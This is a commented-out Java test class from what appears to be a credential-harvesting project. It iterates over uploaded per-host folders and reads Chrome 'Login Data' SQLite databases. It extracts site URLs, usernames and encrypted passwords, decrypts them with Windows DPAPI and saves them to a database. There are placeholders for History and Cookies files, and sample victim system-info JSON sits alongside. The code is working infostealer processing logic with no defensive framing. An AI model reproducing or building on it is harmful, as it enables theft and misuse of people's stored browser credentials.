//import com.jimmy.infaction.common.*;
//import java.io.File;
//import java.util.Arrays;
//import java.util.List;
//
//import com.jimmy.infaction.pojo.Browser;
//import com.jimmy.infaction.service.BrowserService;
//import com.sun.jna.platform.win32.Crypt32Util;
//import org.junit.Test;
//import org.junit.runner.RunWith;
//import org.springframework.beans.factory.annotation.Autowired;
//import org.springframework.test.context.ContextConfiguration;
//import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
//import org.springframework.test.context.web.WebAppConfiguration;
//
//@RunWith(SpringJUnit4ClassRunner.class)
//@ContextConfiguration(locations = "classpath:spring/spring-*.xml")
//@WebAppConfiguration("src/main/resources")
//public class TestA {
//	@Autowired(required = true)
//	private BrowserService browserService ;
//	@Test
//	public  void  t1()   throws Exception{
////		String jsonstr = "[{\"hostname\":\"RSVUBLJAANBQZT6\",\"uptime\":107492,\"bootTime\":1569191716,\"procs\":221,\"os\":\"windows\",\"platform\":\"Microsoft Windows 10 Pro\",\"platformFamily\":\"Standalone Workstation\",\"platformVersion\":\"10.0.18362 Build 18362\",\"kernelVersion\":\"\",\"kernelArch\":\"x86_64\",\"virtualizationSystem\":\"\",\"virtualizationRole\":\"\",\"hostid\":\"e5b51039-15d7-47a7-9470-adf9888dee3c\"}]";
////		JSONArray jsonArray = new JSONArray(jsonstr);
////		JSONObject jsonObj = jsonArray.getJSONObject(0);
////		System.out.println(jsonObj.getString("platform"));
//		String rootPath = "F:\\workspace\\infaction\\upload\\";
//		File dir = new File(rootPath);
//		File[] files = dir.listFiles();
//		for (File f : files) {
//			if (!(f.getName().matches(".*.zip"))) {
//				for (File ff : f.listFiles()) {
//					try {
//						switch (ff.getName()){
//							case "Login Data":
//								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+ff.getName());
//								List<SqlLiteDemoResult> demoList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
//								for (SqlLiteDemoResult result : demoList) {
//									Browser browser = new Browser();
//									browser.setWebsite(result.getAction_url());
//									browser.setHostid(f.getName());
//									browser.setUser(result.getUsername_value());
//									browser.setPassword(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
//									browserService.insert(browser);
//								}
//							case "History":
////								System.out.println(ff.getName());
//							case "Cookies":
////								System.out.println(ff.getName());
//							default:
//								continue;
//						}
//					} catch (Exception e) {
//						e.printStackTrace();
//					}
////					ff.delete();
//				}
//			}
//		}
//	}
//}
